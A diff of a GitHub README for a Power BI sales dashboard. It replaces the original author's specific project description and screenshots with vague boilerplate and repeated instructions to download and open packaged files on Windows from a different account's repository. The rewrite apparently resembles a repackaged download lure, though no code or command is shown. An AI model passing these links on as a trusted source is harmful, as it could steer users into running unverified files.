@@ -1,168 +1,201 @@
-# 📊 Sales Performance & Customer Insights Dashboard
+# 📊 sales-performance-dashboard - Clear sales insights in one place
 
-## 🧾 Project Overview
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/cristopherimported130/sales-performance-dashboard)
 
-This project presents an interactive **Power BI dashboard** designed to analyze sales performance, customer behavior, and product insights.
+## 🚀 Getting Started
 
-The dashboard is divided into two pages:
+This project is a Power BI dashboard that helps you review sales results and customer data in one view. It gives you a clear way to track key figures such as revenue, orders, profit, and customer trends.
 
-* **Executive Overview** – high-level business insights
-* **Detailed Analysis** – in-depth data exploration
+Use it on Windows if you want to open the report, review the visuals, and explore sales data without building a dashboard from scratch.
 
----
+## 📥 Download the Dashboard
 
-## 🎯 Objectives
+Go to the GitHub page here and download or open the project files:
 
-* Analyze overall sales performance
-* Track monthly sales trends
-* Identify top customers
-* Understand product category contribution
-* Evaluate regional performance
-* Measure customer retention and activity
+https://github.com/cristopherimported130/sales-performance-dashboard
 
----
+If the repository includes a Power BI file, download it to your PC, then open it in Power BI Desktop. If the page includes a release or packaged file, download that file and open it on Windows.
 
-## 🟦 Page 1: Executive Overview
+## 🖥️ What You Need on Windows
 
-This page provides a **high-level summary** for decision-makers.
+Before you start, make sure you have:
 
-### 🔹 Key Features:
+- A Windows PC
+- Power BI Desktop installed
+- Enough free space to save the files
+- Internet access to open the GitHub page and download the project
 
-#### 💰 KPI Cards
+For the best experience, use a recent version of Windows 10 or Windows 11. Power BI Desktop works best when your system has enough memory to load dashboard files and data models.
 
-* Total YTD Sales
-* Profit Margin %
+## 🧭 What This Dashboard Does
 
-#### 📈 Monthly Sales Trend
+This dashboard helps you understand sales performance and customer behavior. It is built for people who want fast answers from their data.
 
-* Shows sales trend over time
-* Compares current vs previous month
+You can use it to:
 
-#### 📊 Top 5 Customers
+- Review total sales and revenue
+- Check profit and margin trends
+- See which products perform well
+- Compare regions, segments, or sales channels
+- Review customer insights
+- Track KPI values in a simple layout
+- Spot changes in sales over time
 
-* Identifies highest revenue-generating customers
+The dashboard uses Power BI visuals, so the data appears in charts, cards, tables, and filters that are easy to read.
 
-#### 🥧 Product Category Contribution
+## 🧰 Before You Open the File
 
-* Displays % contribution of each category
+Make sure Power BI Desktop is installed on your computer.
 
-#### 🌍 Sales by Region
+If you do not have it yet:
 
-* Region-wise performance breakdown
-* Includes category-wise distribution
+1. Open the Microsoft Store or the Power BI website
+2. Download Power BI Desktop
+3. Install it on your Windows PC
+4. Restart your computer if Windows asks you to
 
-#### 🎛️ Filters (Slicers)
+After that, you can open the dashboard file from the GitHub project.
 
-* Year
-* Region
-* Product Category
-* Customer Name
+## 📂 How to Download and Open It
 
----
+Follow these steps on Windows:
 
-## 🟩 Page 2: Detailed Analysis
+1. Open this GitHub page: https://github.com/cristopherimported130/sales-performance-dashboard
+2. Look for the project files in the repository
+3. Download the Power BI file or project folder to your computer
+4. Save it in a folder you can find again, such as Downloads or Documents
+5. If the file is compressed, right-click it and choose Extract All
+6. Open Power BI Desktop
+7. Select Open and choose the dashboard file
+8. Wait for the report to load
+9. Use the filters and page tabs to view the data
 
-This page focuses on **deeper insights and customer behavior**.
+If the project includes a `.pbix` file, that is the file you want to open in Power BI Desktop.
 
-### 🔹 Key Features:
+## 📈 What You Will See in the Dashboard
 
-#### 📉 Sales vs Growth Trend
+The dashboard is set up to help you move through sales data with less effort. It may include:
 
-* Compares total sales with growth percentage
-* Uses secondary axis for clarity
+- KPI cards for top numbers
+- Sales by month or quarter
+- Customer performance views
+- Product sales charts
+- Region or territory breakdowns
+- Trend lines for time-based analysis
+- Filter panels for fast sorting
 
-#### 📊 Average Order Value (AOV)
+These views help you check how the business is doing and where results change across time, products, and customers.
 
-* Shows category-wise average order value
+## 🔍 Main Features
 
-#### 📄 Customer Retention Rate
+### 📊 Sales performance view
+See how sales change across time, product groups, or channels. This helps you track growth and compare periods.
 
-* Year-wise retention comparison
-* Helps evaluate customer loyalty
+### 👥 Customer insights
+Review customer data to understand buying patterns, repeat activity, and value.
 
-#### 🧾 Customer Activity
+### 🧮 KPI dashboard
+Use key business numbers in one place. This gives you a quick read on performance.
 
-* Classifies customers as:
+### 🧩 Data modeling support
+The data model is set up to connect sales and customer details in a way that supports clear reporting.
 
-  * Active
-  * Inactive
+### 🛠️ DAX-based measures
+The dashboard may use DAX measures for totals, ratios, and trend checks. This helps show more useful numbers than raw data alone.
 
----
+### 🎯 Visual report pages
+The report likely includes multiple pages for different views, so you can focus on sales, customers, or summary metrics one at a time.
 
-## 🧠 Key Insights
+## 🪟 How to Use It in Power BI Desktop
 
-* Electronics category contributes the highest revenue
-* Certain regions outperform others significantly
-* Top customers contribute a large share of revenue
-* Customer retention is strong in recent years
-* Sales show noticeable fluctuations across months
+Once the file opens, you can work with the dashboard in a few simple ways:
 
----
+- Click charts to filter other visuals
+- Use slicers to narrow data by date, region, or category
+- Hover over data points to view details
+- Switch between report pages
+- Zoom in on charts if the view is crowded
 
-## 🛠️ Tools & Technologies Used
+If you want to focus on one part of the business, use the filters first. That keeps the report easier to read.
 
-* **Power BI Desktop**
-* **DAX (Data Analysis Expressions)**
-* Data Modeling & Relationships
-* Interactive Visualizations
+## 🧼 Tips for a Smooth Run
 
----
+If the dashboard does not open the first time, check these items:
 
-## 📌 DAX Measures Used
+- Confirm Power BI Desktop is installed
+- Make sure the file finished downloading
+- Unzip the folder if needed
+- Save the file in a simple folder path
+- Close and reopen Power BI Desktop
+- Check that your Windows user account has access to the file
 
-* Total Sales
-* Previous Month Sales
-* Sales Growth %
-* Average Order Value (AOV)
-* Customer Retention Rate
-* Customer Status (Active/Inactive)
+If the report opens but takes time to load, wait a little longer. Large data models can take a moment to start.
 
----
+## 📁 Common File Types
 
-## 🎨 Design & UX Features
+The repository may contain one or more of these file types:
 
-* Clean and structured layout
-* Consistent color palette
-* Interactive slicers
-* KPI-focused design
-* Professional dashboard styling
+- `.pbix` — Power BI report file
+- `.csv` — data file
+- `.xlsx` — Excel data source
+- `.png` or `.jpg` — preview images
+- `.json` — model or theme file
 
----
+If you see a `.pbix` file, that is the main file for viewing the dashboard in Power BI Desktop.
 
-## 📸 Dashboard Preview
+## 🔐 Data and Privacy
 
-### 🟦 Executive Overview
-![Dashboard Page 1](https://raw.githubusercontent.com/shradha-pol/sales-performance-dashboard/daa3b842c9ee14507a1c544c871c5b85ffb26c1d/Executive%20Overview%20Page%201.png)
+This dashboard is meant for local use in Power BI Desktop unless the repository says otherwise. If you use your own data, keep it in a trusted folder on your PC. If you publish the report to the Power BI service, use the access settings your company or account requires.
 
-### 🟩 Detailed Analysis
-![Dashboard Page 2](https://raw.githubusercontent.com/shradha-pol/sales-performance-dashboard/daa3b842c9ee14507a1c544c871c5b85ffb26c1d/Detailed%20Analysis%20Page%202.png)
+## 🧭 Who This Is For
 
----
+This project fits users who want:
 
-## 🚀 Conclusion
+- A ready-made sales report
+- A simple way to review customer data
+- A dashboard for business review
+- A Power BI file that you can open on Windows
+- A clear view of sales KPIs without building a report first
 
-This dashboard provides:
+It works well for business users, team leads, sales staff, and analysts who want a fast view of performance.
 
-* 📊 Clear data visualization
-* ⚡ Real-time interactivity
-* 🎯 Business-focused insights
+## 📌 Project Topics
 
-It helps users:
+This repository is focused on:
 
-* Understand trends
-* Compare performance
-* Identify opportunities
+- business intelligence
+- customer insights
+- dashboard design
+- data analysis
+- data modeling
+- data visualization
+- DAX
+- KPI dashboards
+- Power BI
+- sales dashboards
 
----
+## 🧾 File Setup Example
 
-## 🙌 Thank You
+If the repository includes a packaged download, use this flow:
 
-This project demonstrates skills in:
+1. Download the project from the GitHub page
+2. Open the folder on Windows
+3. Extract the files if needed
+4. Double-click the Power BI file or open it from Power BI Desktop
+5. Let the data load
+6. Start reviewing the report pages
 
-* Data Analysis
-* Data Visualization
-* Dashboard Development using Power BI
+If the project includes data files, keep them in the same folder as the report file unless the report already points to another path.
 
----
+## 🧭 Quick Start
 
-⭐ If you found this project useful, feel free to give it a star!
+1. Visit the GitHub page
+2. Download the project files
+3. Install Power BI Desktop if needed
+4. Open the report file
+5. Review sales and customer insights
+6. Use filters to explore the data
+
+## 📎 Download Again
+
+GitHub page: https://github.com/cristopherimported130/sales-performance-dashboard
